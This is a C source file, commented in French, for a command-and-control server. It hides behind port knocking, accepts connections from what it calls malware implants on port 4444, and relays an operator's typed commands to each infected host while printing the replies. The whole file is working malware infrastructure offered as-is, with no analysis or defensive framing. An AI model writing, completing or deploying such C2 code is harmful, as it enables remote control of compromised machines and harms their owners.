
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include "port_knocking.h"

#define PORT 4444
#define MAX_CONN 10
#define BUFFER_SIZE 1024

void *handle_client(void *arg) {
    int client_sock = *(int*)arg;
    free(arg);
    char buffer[BUFFER_SIZE];

    printf("[+] Nouveau client connecté\n");

    // Réception du message initial du client
    int bytes_received = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
    if (bytes_received <= 0) {
        printf("[C2] Erreur lors de la réception, fermeture du client.\n");
        close(client_sock);
        return NULL;
    }
    
    buffer[bytes_received] = '\0';
    printf("[+] Nouveau malware enregistré : %s\n", buffer);

    // Boucle pour envoyer des commandes au client
    while (1) {
        printf("[C2] Entrez une commande (ou 'exit' pour quitter) : ");
        fflush(stdout);

        memset(buffer, 0, sizeof(buffer));
        fgets(buffer, sizeof(buffer), stdin);
        buffer[strcspn(buffer, "\n")] = 0;

        if (strcmp(buffer, "exit") == 0) {
            printf("[C2] Fermeture de la connexion avec le client.\n");
            break;
        }

        // Envoyer la commande au client
        send(client_sock, buffer, strlen(buffer), 0);

        // Recevoir la réponse du client
        memset(buffer, 0, sizeof(buffer));
        bytes_received = recv(client_sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received <= 0) {
            printf("[C2] Client déconnecté\n");
            break;
        }

        buffer[bytes_received] = '\0';
        printf("[C2] Réponse du client :\n%s\n", buffer);
    }

    close(client_sock);
    pthread_exit(NULL);
}

int main() {
    wait_for_knock();
    
    int server_sock, *new_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_size = sizeof(client_addr);
    pthread_t thread_id;

    // Création du socket
    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    // Éviter "Address already in use" après une fermeture brutale
    int opt = 1;
    setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    // Bind et écoute
    bind(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
    listen(server_sock, MAX_CONN);

    printf("[+] Serveur C2 en attente de connexions sur le port %d...\n", PORT);

    while (1) {
        new_sock = malloc(sizeof(int));
        *new_sock = accept(server_sock, (struct sockaddr*)&client_addr, &addr_size);
        printf("[+] Connexion d'un malware depuis : %s\n", inet_ntoa(client_addr.sin_addr));

        // Lancer un thread pour gérer le client
        pthread_create(&thread_id, NULL, handle_client, (void*)new_sock);
        pthread_detach(thread_id);
    }

    close(server_sock);
    return 0;
}